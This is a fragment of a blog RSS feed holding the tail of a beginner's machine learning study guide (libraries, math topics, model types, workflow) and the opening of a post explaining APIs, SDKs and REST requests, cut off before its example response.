+<img decoding="async" class="size-full wp-image-10292 alignnone" src="/wp-content/uploads/2022/09/25f6b013-351d-442f-b6f1-0ae11cd285d3-e1581506887542.jpg" alt="25f6b013 351d 442f b6f1 0ae11cd285d3 e1581506887542 Machine Learning quick start guide for enthusiast" width="600" height="321" srcset="/wp-content/uploads/2022/09/25f6b013-351d-442f-b6f1-0ae11cd285d3-e1581506887542.jpg 600w, /wp-content/uploads/2022/09/25f6b013-351d-442f-b6f1-0ae11cd285d3-e1581506887542-480x257.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 600px, 100vw"><br />
+</strong>For machine learning Python/R is in leading but from a developer perspective Python could be a choice for it&#8217;s huge community and rich <span class="TextRun SCXW144258744 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW144258744 BCX0">libraries</span></span>. We need a bettter understanding with all of it&#8217;s language related basics like- <em>Lists, List Slicing, Tuples, Dictionaries, Counters, Sets, Zip and Argument Unpacking</em> , data structure and algorighms. As well as following libraries are need to know while starting-</p>
+<ul>
+<li><strong>NumPy</strong> is a well known general-purpose array-processing package. An extensive collection of high complexity mathematical functions make NumPy powerful to process large multi-dimensional arrays and matrices</li>
+<li><strong>SciPy</strong> is a free and open-source library that’s based on NumPy. It can be used to perform scientific and technical computing on large sets of data. Similar to NumPy, SciPy comes with embedded modules for array optimization and linear algebra. It’s considered a foundational Python library due to its critical role in scientific analysis and engineering.</li>
+<li><strong>scikit-learn</strong> is a free Python library based on NumPy and SciPy, that’s often considered a direct extension of SciPy. It was specifically designed for data modeling and developing machine learning algorithms, both supervised and unsupervised.</li>
+<li><strong>Pandas</strong> is another Python library that is built on top of NumPy, responsible for preparing high-level data sets for machine learning and training. It relies on two types of data structures, one-dimensional (series) and two-dimensional (DataFrame).</li>
+<li><strong>Seaborn</strong> is another open-source Python library, one that is based on Matplotlib (which focuses on plotting and data visualization) but features Pandas’ data structures. Seaborn is often used in ML projects because it can generate plots of learning data.</li>
+<li><strong>Matplotlib</strong> is a Python library focused on data visualization and primarily used for creating beautiful graphs, plots, histograms, and bar charts. It is compatible for plotting data from SciPy, NumPy, and Pandas. If you have experience using other types of graphing tools, Matplotlib might be the most intuitive choice for you.there are many more <span class="TextRun SCXW144258744 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW144258744 BCX0">libraries</span></span></li>
+</ul>
+</li>
+<li><strong>Linear Algebra:<br />
+<img decoding="async" class="wp-image-10293 alignnone" src="/wp-content/uploads/2022/09/linear-algebra.jpg" alt="linear algebra Machine Learning quick start guide for enthusiast" width="738" height="359"><br />
+</strong></p>
+<ul>
+<li>Vectors Basics: Introduction to vectors, Vector arithmetic, Coordinate system</li>
+<li>Vector Projections and Basis: Dot product of vectors, Scalar and vector projection, Changing basis of vectors, Basis, linear independence, and span</li>
+<li>Matrices: Matrices introduction,Types of matrices,Types of matrix transformation,Composition or combination of matrix transformations</li>
+<li>Gaussian Elimination: Solving linear equations using Gaussian elimination,Gaussian elimination and finding the inverse matrix, Inverse and determinant</li>
+<li>Matrices from Orthogonality to Gram–Schmidt Process: Matrices changing basis ,Transforming to the new basis ,Orthogonal matrix, Gram–Schmidt process</li>
+<li>Eigenvalues and Eigenvectors: Calculating eigenvalues and eigenvectors</li>
+</ul>
+</li>
+</ul>
+<p><span class="EOP SCXW177857176 BCX0" data-ccp-props="{&quot;335559739&quot;:0}">                 For <a href="https://www.khanacademy.org/math/linear-algebra" rel="nofollow noopener" target="_blank">Linear algebra Khan Accademy</a>  and <a href="https://learning.edx.org/course/course-v1:Microsoft+DAT256x+2T2018/home" rel="nofollow noopener" target="_blank">edX Essential Math for Machine Learning: Python Edition </a> </span></p>
+<ul>
+<li><strong>Statistics &amp; Probability:<br />
+<img decoding="async" class="wp-image-10295 alignnone" src="/wp-content/uploads/2022/09/Screen-Shot-2022-06-13-at-10.20.58-AM.png" alt="Screen Shot 2022 06 13 at 10.20.58 AM Machine Learning quick start guide for enthusiast" width="846" height="385"><br />
+</strong></p>
+<ul>
+<li>Populations and Samples</li>
+<li>Mean, Median, Mode</li>
+<li>Variance, Range, Inter Quartile Range (IQR), Skewness</li>
+<li>Correlation, Correlation and Causation</li>
+<li>Dependence and Independency</li>
+<li>Conditional Probability</li>
+<li>Bayes&#8217;s Theorem and Random variables</li>
+<li>Distributions
+<ul>
+<li>Continuous Distribution</li>
+<li>Normal Distribution</li>
+</ul>
+</li>
+<li>Central Limit Theorem (CLT)</li>
+<li>Hypothesis Testing: Null Hypothesis(H0), Alternate Hypothesis (HA)</li>
+<li>Errors in Hypothesis Testing: Type 1 Error, Type 2 Error</li>
+<li>Statistical Significance and P-Values</li>
+<li>The chi-square goodness of fit test</li>
+<li><span class="TextRun SCXW130375983 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW130375983 BCX0">Confusion Matrix, <span class="TextRun Underlined SCXW112836330 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW112836330 BCX0">Precision, <span class="TextRun SCXW82991890 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW82991890 BCX0">Accuracy</span></span>, Recall, F1 Score</span></span></span></span></li>
+</ul>
+</li>
+</ul>
+<p>Resource for learning: <a href="https://www.khanacademy.org/math/statistics-probability" rel="nofollow noopener" target="_blank">Statistics and probability &#8211; Khan Academy</a>,<a href="https://www.coursera.org/learn/stanford-statistics" rel="nofollow noopener" target="_blank"> Introduction to Statistics-Coursera</a>,  <a href="https://www.coursera.org/learn/statistics-for-data-science-python" rel="nofollow noopener" target="_blank">Statistics for Data Science with Python-Coursera </a></p>
+<ul>
+<li><strong>Database Knowledge</strong>: Some basics of SQL and NoSQL may help. Basic of SQL queries like-
+<ul>
+<li>Join (Inner, Outer, Full, Cross)</li>
+<li>Pivot and Unpivote</li>
+<li>Window Functions
+<ul>
+<li>Aggregate Window Functions &#8211; SUM, MIN, MAX, AVG, COUNT</li>
+<li>Ranking Window Functions &#8211;  RANK, DENSE_RANK, ROW_NUMBER, NTILE</li>
+<li>Value Window Functions &#8211; LAG() and LEAD,FIRST_VALUE and LAST_VALUE</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>IDE:<br />
+<img decoding="async" class="wp-image-10298 alignnone" src="/wp-content/uploads/2022/09/maxresdefault.jpg" alt="Machine Learning quick start guide for enthusiast" width="711" height="400"><br />
+</strong></p>
+<ul>
+<li><strong>Spyder</strong>: Scientific Python Development Environment (Spyder) is a free &amp; open-source python IDE. It is lightweight and is an excellent python ide for data science &amp; ML</li>
+<li><strong>Jupiter Notebook:</strong> For its simplicity this one became a great IDE among the data enthusiasts as it is the descendant of IPython. Best thing of JuPyter is that there you can very easily switch between the different versions of python (or any other language) according to your preference.</li>
+<li><strong>Visual Studio Code</strong>: Visual Code is one of the most used Python IDE by ML &amp; DS professionals. It works on Windows, Mac, and Linux operating systems.</li>
+</ul>
+</li>
+<li><strong><span class="NormalTextRun SCXW174132279 BCX0">Machine</span> Learning:</strong> Supervised and Unsupervised learning are the two techniques of machine learning. But both the techniques are used in different scenarios and with different datasets.<br />
+<strong>Supervised</strong> learning is a machine learning method in which models are trained using labeled data.In supervised learning, models need to find the mapping function to map the input variable (X)<br />
+with the output variable (Y).<br />
+<strong>Unsupervised</strong> learning is another machine learning method in which patterns inferred from the unlabeled input data. The goal of unsupervised learning is to find the structure and patterns from the input data. Unsupervised learning does not need any supervision. Instead, it finds patterns from the data by its own. Machine Learning steps are &#8211;</p>
+<ul>
+<li><strong>Business Understanding</strong>: What you want to achieve by implementing it. This is the “business understanding”.
+<ul>
+<li>Identify the business objective/problem
+<ul>
+<li>Regression problems: We have data that needs to be mapped onto a predictor variable, so we need to learn a function that can do this mapping.</li>
+<li>Classification problems: Here, we have data that needs to be divided into predefined classes, based on some features of the data. We need an algorithm that can use previously classified data to learn how to put unknown data into the correct class. Ex: K-Nearest Neighbor for classification of a categorical outcome or prediction of a numerical outcome, Naïve Bays Classifier- Can be applied to data with categorical predictor.</li>
+<li>Summarization problems: Suppose we have data that needs to be shortened or summarized in some way. This could be as simple as calculating basic statistics from data, or as complex as learning how to summarize text or finding a topic model for text.</li>
+<li>Dependency modeling problems: For these problems, we have data that might be connected in some way, and we need to develop an algorithm that can calculate the probability of connection or describe the structure of connected data.</li>
+<li>Change and deviation detection problems: In another case, we have data that has changed significantly or where some subset of the data deviates from normative values. To solve these problems, we need an algorithm that can detect these issues automatically.</li>
+</ul>
+</li>
+<li>Assess the situation</li>
+<li>Determine the analytical goals</li>
+<li>Produce a project plan</li>
+</ul>
+</li>
+<li><strong>Data Understanding</strong>: Determining what kind of data can be collected to build a deployable model. In the next phase, “data understanding,”
+<ul>
+<li>Collect the data</li>
+<li>Describe the data</li>
+<li>Explore the data</li>
+<li>Verify the data quality</li>
+</ul>
+</li>
+<li><strong>Data Preprocessing:</strong>
+<ul>
+<li style="text-align: left;">Importing/Selecting the Dataset<br />
+<img decoding="async" class="wp-image-10363 alignnone" src="/wp-content/uploads/2022/09/5.3.1.png" alt="5.3.1 Machine Learning quick start guide for enthusiast" width="858" height="115"></li>
+<li style="text-align: left;">Handling Missing Data<br />
+<img decoding="async" class=" wp-image-10364 alignnone" src="/wp-content/uploads/2022/09/5.3.2.png" alt="5.3.2 Machine Learning quick start guide for enthusiast" width="858" height="139"></li>
+<li style="text-align: left;">Handling Categorical Data<br />
+<img decoding="async" class=" wp-image-10365 alignnone" src="/wp-content/uploads/2022/09/5.3.3.png" alt="5.3.3 Machine Learning quick start guide for enthusiast" width="858" height="222"></li>
+<li style="text-align: left;">Splitting the Dataset into the Training set and Test set<br />
+<img decoding="async" class=" wp-image-10366 alignnone" src="/wp-content/uploads/2022/09/5.3.4.png" alt="5.3.4 Machine Learning quick start guide for enthusiast" width="859" height="84"></li>
+<li style="text-align: left;">Feature Scaling<br />
+<img decoding="async" class=" wp-image-10367 alignnone" src="/wp-content/uploads/2022/09/5.3.5.1-1.png" alt="5.3.5.1 1 Machine Learning quick start guide for enthusiast" width="858" height="199"><br />
+<img decoding="async" class=" wp-image-10368 alignnone" src="/wp-content/uploads/2022/09/5.3.5.2.png" alt="5.3.5.2 Machine Learning quick start guide for enthusiast" width="857" height="332"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><strong><span class="TextRun SCXW89223852 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW89223852 BCX0" data-ccp-parastyle="heading 2">Modeling: </span></span></strong><span class="TextRun SCXW89223852 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW89223852 BCX0" data-ccp-parastyle="heading 2">As per the business need we have to chose <span class="NormalTextRun SCXW205233688 BCX0">appropriate</span> model from various kind of available models-</span></span>
+<ul>
+<li><strong>Regression:</strong> Value estimation, Ex- how much wills this customer use the service?
+<ul>
+<li><strong>Linear Regression:</strong> Linear regression is an approach in modeling that helps model the scalar linear relationship between a scalar dependent variable, Y, and an independent variable, X, which can be one or more in value: y = X_ +_
+<ul>
+<li><span class="TextRun SCXW60745364 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW60745364 BCX0" data-ccp-charstyle="Heading 4 Char"><strong>Simple linear regression:</strong> <span class="TextRun SCXW241629472 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW241629472 BCX0">A simple linear regression has a single variable, and it can be described using the following formula: </span></span><span class="TextRun SCXW241629472 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW241629472 BCX0">y= A + Bx</span></span><span class="EOP SCXW241629472 BCX0" data-ccp-props="{&quot;201341983&quot;:0,&quot;335559685&quot;:720,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"> </span></span></span></li>
+<li>
+<p aria-level="5"><span data-contrast="none"><strong>Multiple linear regression model:</strong> </span><span data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span data-contrast="auto">Multiple linear regression occurs when more than one independent variable is used to predict a dependent variable: Y_ = a +b1x1+b2x2 +…+ bnxn</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"> </span></p>
+</li>
+<li>
+<p aria-level="5"><b><span data-contrast="none">Polynomial Regression:</span></b><span data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span data-contrast="auto">A regression equation is a polynomial regression equation if the power of independent variable is more than 1. The equation below represents a polynomial equation: y=a + b*x^2</span><span data-ccp-props="{}"><br />
+<img decoding="async" class="aligncenter size-full wp-image-10339" src="/wp-content/uploads/2022/09/regression.png" alt="regression Machine Learning quick start guide for enthusiast" width="1183" height="250" srcset="/wp-content/uploads/2022/09/regression.png 1183w, /wp-content/uploads/2022/09/regression-980x207.png 980w, /wp-content/uploads/2022/09/regression-480x101.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1183px, 100vw"><br />
+</span></p>
+</li>
+</ul>
+</li>
+<li><strong><span class="NormalTextRun SCXW80789932 BCX0" data-ccp-parastyle="heading 4">Non-Linear</span><span class="NormalTextRun SCXW80789932 BCX0" data-ccp-parastyle="heading 4"> Regression:</span></strong>
+<ul>
+<li><span class="TextRun SCXW151676946 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW151676946 BCX0" data-ccp-parastyle="heading 5">Support Vector Regression SVR</span></span></li>
+<li><span class="TextRun SCXW221411858 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW221411858 BCX0" data-ccp-parastyle="heading 5">Decision Tree Regression</span></span><span class="EOP SCXW221411858 BCX0" data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span></li>
+<li><span class="TextRun SCXW58969965 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW58969965 BCX0" data-ccp-parastyle="heading 5">Random Forest Regression</span></span></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><span class="TextRun SCXW213434387 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW213434387 BCX0" data-ccp-parastyle="heading 3">Classification: </span></span></strong><span class="TextRun SCXW213434387 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW213434387 BCX0" data-ccp-parastyle="heading 3"><span class="TextRun SCXW9609195 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW9609195 BCX0">Will this customer purchase service S1 if given incentive I? Which service package (S1, S2, or none) will a customer likely purchase if given incentive I?</span></span></span></span>
+<ul>
+<li><span class="TextRun Underlined SCXW196884260 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><strong><span class="NormalTextRun SCXW196884260 BCX0" data-ccp-parastyle="heading 4">Decision trees</span></strong><span class="NormalTextRun SCXW196884260 BCX0" data-ccp-parastyle="heading 4">: </span></span><span class="EOP SCXW196884260 BCX0" data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span class="TextRun SCXW36949272 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW36949272 BCX0">Decision tree is a type of supervised learning algorithm (having a pre-defined target variable) that is mostly used in classification problems. It works for both categorical and continuous input and output variables.</span></span></li>
+<li><strong><span class="TextRun SCXW235591358 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW235591358 BCX0" data-ccp-parastyle="heading 4">Random Forest Classification</span></span></strong><span class="TextRun SCXW235591358 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW235591358 BCX0" data-ccp-parastyle="heading 4">:</span></span><span class="EOP SCXW235591358 BCX0" data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span class="TextRun SCXW131443930 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW131443930 BCX0">Random Forest is a trademark term for an ensemble of decision trees. In Random Forest, we’ve collection of decision trees (so known as “Forest”). To classify a new object based on attributes, each tree gives a classification and we say the tree “votes” for that class. The forest chooses the classification having the most votes (over all the trees in the forest.</span></span><span class="EOP SCXW131443930 BCX0" data-ccp-props="{}"> </span></li>
+<li><span class="TextRun SCXW256144533 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><strong><span class="NormalTextRun SCXW256144533 BCX0" data-ccp-parastyle="heading 4">Logistic regression</span></strong><span class="NormalTextRun SCXW256144533 BCX0" data-ccp-parastyle="heading 4"><strong>:</strong> </span></span><span class="EOP SCXW256144533 BCX0" data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span class="TextRun SCXW250130968 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW250130968 BCX0">Logistic regression extends the idea of linear regression to the situation where the dependent variable Y is categorical. We can think of a categorical variable as dividing the observations in to classes.  </span></span><span class="LineBreakBlob BlobObject DragDrop SCXW250130968 BCX0"><span class="SCXW250130968 BCX0"> </span></span><span class="TextRun SCXW250130968 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW250130968 BCX0">Don’t get confused by its name! It is a classification not a regression algorithm.<br />
+<img decoding="async" class="wp-image-10343 alignnone" src="/wp-content/uploads/2022/09/lr.png" alt="lr Machine Learning quick start guide for enthusiast" width="924" height="310"><br />
+</span></span></li>
+<li>
+<p aria-level="4"><b><span data-contrast="none">The naive Bayes classifier: </span></b><span data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span data-contrast="auto">It works on Bayes theorem of probability to predict the class of unknown data set.</span> <span data-contrast="auto">Naive Bayes uses a similar method to predict the probability of different class based on various attributes. This algorithm is mostly used in text classification and with problems having multiple classes.</span></p>
+</li>
+<li>
+<p aria-level="4"><b><i><span data-contrast="none">SVM (Support Vector Machine):</span></i></b><span data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span data-contrast="auto"> </span><span data-contrast="auto">It is a classification method. In this algorithm, we plot each data item as a point in n-dimensional space (where n is number of features you have) with the value of each feature being the value of a particular coordinate.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"> </span><span data-contrast="auto">For example, if we only had two features like Height and Hair length of an individual, we’d first plot these two variables in two dimensional space where each point has two co-ordinates (these co-ordinates are known as Support Vectors)</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"> </span></p>
+</li>
+<li><span class="TextRun SCXW157341624 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW157341624 BCX0" data-ccp-parastyle="heading 4"><strong>K-Nearest Neighbor:</strong> </span></span><span class="EOP SCXW157341624 BCX0" data-ccp-props="{&quot;335559738&quot;:200,&quot;335559739&quot;:0}"> </span><span class="TextRun SCXW48525375 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW48525375 BCX0">KNN can be used for both classification and regression predictive problems. The “K” in KNN algorithm is the nearest neighbors we wish to take vote from?<br />
+<img decoding="async" class="wp-image-10349 alignnone" src="/wp-content/uploads/2022/09/knn.png" alt="knn Machine Learning quick start guide for enthusiast" width="783" height="297"><br />
+</span></span></li>
+</ul>
+</li>
+<li><span class="TextRun SCXW77015521 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW77015521 BCX0" data-ccp-parastyle="heading 3"><strong>Clustering</strong>: </span></span>
+<ul>
+<li><span class="NormalTextRun SCXW193408192 BCX0"><strong>k-means clustering:</strong>  The k-means clustering is an unsup</span><span class="NormalTextRun SCXW193408192 BCX0">ervised learning technique that </span><span class="NormalTextRun SCXW193408192 BCX0">helps in partitioning data of n observations into K buckets of similar observations.</span></li>
+<li><strong><span class="TextRun Underlined SCXW129119889 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW129119889 BCX0">Hierarchical clustering:</span></span></strong> <span class="TextRun SCXW129119889 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW129119889 BCX0">Hierarchical clustering is an unsupervised learning technique where a hierarchy of clusters is built out of observations</span></span></li>
+<li><strong> <span class="TextRun SCXW65955475 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW65955475 BCX0">Divisive hierarchical clustering</span></span></strong><span class="TextRun SCXW65955475 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW65955475 BCX0"><strong>:</strong> This is a top-down approach where observations start off in a single cluster and then they are split into two as they go down a hierarchy</span><span class="NormalTextRun SCXW65955475 BCX0">.</span></span></li>
+</ul>
+</li>
+<li><strong>Recommender Systems: </strong>Recommendations help monetize user behavior data that businesses capture. This allows them to recommend the content that they like. Recommender systems are a way of suggesting or similar items and ideas to a user’s specific way of thinking.</li>
+</ul>
+</li>
+<li><strong><span class="TextRun Underlined SCXW60958742 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW60958742 BCX0" data-ccp-parastyle="heading 2">Model </span><span class="NormalTextRun SCXW60958742 BCX0" data-ccp-parastyle="heading 2">Evaluation:</span></span><span class="EOP SCXW60958742 BCX0" data-ccp-props="{&quot;134233117&quot;:true,&quot;134233118&quot;:true,&quot;201341983&quot;:0,&quot;335559740&quot;:240}"> </span></strong>
+<ul>
+<li><span class="TextRun SCXW28168107 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW28168107 BCX0"> Evaluate the results, is it Overfitting (Good performance on the training data, poor generliazation to other data) or Underfitting (Poor performance on the training data and poor generalization to other data)</span></span></li>
+<li><span class="TextRun SCXW13247658 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW13247658 BCX0">Review the process</span></span></li>
+<li><span class="TextRun SCXW172585727 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="TextRun SCXW172585727 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW172585727 BCX0">Determine the next steps based on evaluation score<br />
+<img decoding="async" class="wp-image-10352 alignnone" src="/wp-content/uploads/2022/09/model-evPNG.png" alt="model evPNG Machine Learning quick start guide for enthusiast" width="706" height="284" srcset="/wp-content/uploads/2022/09/model-evPNG.png 706w, /wp-content/uploads/2022/09/model-evPNG-480x193.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 706px, 100vw"></span></span></span></li>
+</ul>
+</li>
+<li><strong><span class="TextRun Underlined SCXW146877088 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="none"><span class="NormalTextRun SCXW146877088 BCX0" data-ccp-parastyle="heading 2">Test &amp; Deployment:</span></span><span class="EOP SCXW146877088 BCX0" data-ccp-props="{&quot;134233117&quot;:true,&quot;134233118&quot;:true,&quot;201341983&quot;:0,&quot;335559740&quot;:240}">  </span></strong><span class="EOP SCXW146877088 BCX0" data-ccp-props="{&quot;134233117&quot;:true,&quot;134233118&quot;:true,&quot;201341983&quot;:0,&quot;335559740&quot;:240}"><span class="EOP SCXW146877088 BCX0" data-ccp-props="{&quot;134233117&quot;:true,&quot;134233118&quot;:true,&quot;201341983&quot;:0,&quot;335559740&quot;:240}">After validation using various matix model is ready for testing. Here test set will be used for testing. The more data we will use the more the model will be robust.</span></span>More resource</li>
+</ul>
+</li>
+</ul>
+<p>&nbsp;</p>
+<p>for study and parctice : <a href="https://www.coursera.org/learn/machine-learning-with-python" rel="nofollow noopener" target="_blank"> Machine Learning with Python -Coursera</a>   , <a href="https://www.kaggle.com/" rel="nofollow noopener" target="_blank">Kaggle</a>, <a href="https://www.edx.org/" rel="nofollow noopener" target="_blank">edX</a><br />
+Hope this will help to quick start and Achieve Success Quicker.<br />
+Thanks&#8230;..</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/machine-learning-quick-start-guide-for-enthusiast/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>API vs SDK: What&#8217;re the differences?</title>
+		<link>/blog/api-vs-sdk-whatre-the-differences/</link>
+					<comments>/blog/api-vs-sdk-whatre-the-differences/#respond</comments>
+		
+		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
+		<pubDate>Thu, 11 Aug 2022 11:23:55 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[api]]></category>
+		<category><![CDATA[differences]]></category>
+		<category><![CDATA[Http]]></category>
+		<category><![CDATA[Representational State Transfer]]></category>
+		<category><![CDATA[sdk]]></category>
+		<category><![CDATA[Software Development Kit]]></category>
+		<guid isPermaLink="false">/?p=10005</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[<div class="et_pb_section et_pb_section_0 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_0">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_0  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_0  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p class="maps-to-line">As beginner software engineers, we always start with a good understanding of the basics. Like other beginners in any field, we sometimes get confused by technical terminologies. What is an API and what is an SDK?</p>
+<p class="maps-to-line">Every programmer needs to understand how APIs and SDKs work together with their respective systems. APIs and SDKs are more technical aspects of computer programming that are often used in tandem – but have distinct differences, as well.</p>
+<h2 id="exploring-api-vs-sdk-whats-the-difference" class="maps-to-line">Exploring API vs SDK: What&#8217;re the differences</h2>
+<p class="maps-to-line">The terms API and SDK are often used interchangeably, especially when we want to download prebuilt software from a website. But, we shouldn&#8217;t confuse them with each other. Let&#8217;s compare API and SDK to make sure what each one does – and how you should relate to them in your software development environment.</p>
+<p class="maps-to-line">Let&#8217;s say we&#8217;re developing a mobile app for a client or trying out some fun ideas to showcase, the idea is for this mobile app to allow a client to take a picture of a plant and the app will communicate with the visual recognition service which is running on the cloud. The idea is for the service to return the plant&#8217;s name and bring up short descriptions like what genre the plant belongs to, what the scientific name the plant has, etc.</p>
+<blockquote class="maps-to-line">
+<p>Now the question arises how do we do this communication between the mobile app and the cloud-based service?</p>
+</blockquote>
+<p class="maps-to-line">Hmmm&#8230; Well, that&#8217;s where APIs and SDKs come in.<br />Let&#8217;s start with APIs first.</p>
+<blockquote class="maps-to-line">
+<p>API is a technology that allows two programs to communicate with each other.</p>
+</blockquote>
+<p class="maps-to-line">So, first of all, APIs are all about communication. So there are a set of definitions and protocols that are always used for apps or services to talk to other apps or services how to give the example of the plant recognition system above. So basically we can think of them as a bridge between our app and other services. We want to talk to in our case the cloud-based recognition service.</p>
+<p class="maps-to-line">We talk a lot about API. What it stands for anyways.</p>
+<blockquote class="maps-to-line">
+<p>API &#8211; Application Programming Interface</p>
+</blockquote>
+<p class="maps-to-line">Now we need to understand what are some of the aspects of APIs that makes them useful.</p>
+<ol>
+<li class="maps-to-line"><strong>Communication</strong> &#8211; So communicating between service to another service or an app to another app or an app to the backend server, etc.</li>
+<li class="maps-to-line"><strong>Abstraction</strong> &#8211; What this means is, inside the recognition service there would be lots of code probably thousands of lines of code running up but we as mobile app developers don&#8217;t want to have to worry about how the recognition service will figure out those plant information or which function call will give the correct results, other metadata, etc. This complicated logic will be abstracted away by the API. Which simplifies the process for the app developer.</li>
+<li class="maps-to-line"><strong>Standardized</strong> &#8211; This means that there are industry-defined standards for how to define an API. There&#8217;re a few formats that are popular for APIs like SOAP, REST, GraphQL, or RPC.</li>
+</ol>
+<h2 id="we-will-focus-on-rest-for-api-which-stands-for" class="maps-to-line">We will focus on REST for API which stands for</h2>
+<blockquote class="maps-to-line">
+<p>REST &#8211; Representational State Transfer</p>
+</blockquote>
+<p class="maps-to-line">If we want to talk about REST then we have to establish some of the building blocks of APIs first to understand REST.</p>
+<p class="maps-to-line">First, we have to be able to send a request to the server or a specific service in our case recognition service. So, for a REST API call <code class="inline-code">request</code> we need to have some blocks.</p>
+<ol>
+<li class="maps-to-line"><strong>Operation</strong> &#8211; This could be HTTP methods like POST, GET, PUT, PATCH, etc. In our case, we&#8217;ll use POST as we want to send an image file to the recognition service.</li>
+<li class="maps-to-line"><strong>Parameters</strong> &#8211; Although this is Optional. In our case, the file name of the plant pictures is like <code class="inline-code">plant.jpg</code> as a multi-part form of data.</li>
+<li class="maps-to-line"><strong>Endpoint</strong> &#8211; This part will be exposed by the recognition service where we need to send the file like <code class="inline-code">https://littlegiants.io/analize</code></li>
+<li class="maps-to-line"><strong>Headers</strong> &#8211; This is a special part of a REST API request which might have things like an API key or some authentication data.</li>
+</ol>
+<p class="maps-to-line">The above four points act as a request in an API call.</p>
+<p class="maps-to-line">So Now the question is what will be the response of the API call?</p>
+<p class="maps-to-line">Typically it&#8217;s some form of raw data, maybe JSON(Which Stands for Javascript Object Notation) or maybe XML(Extended Markup language), etc. In JSON it might look like below</p>
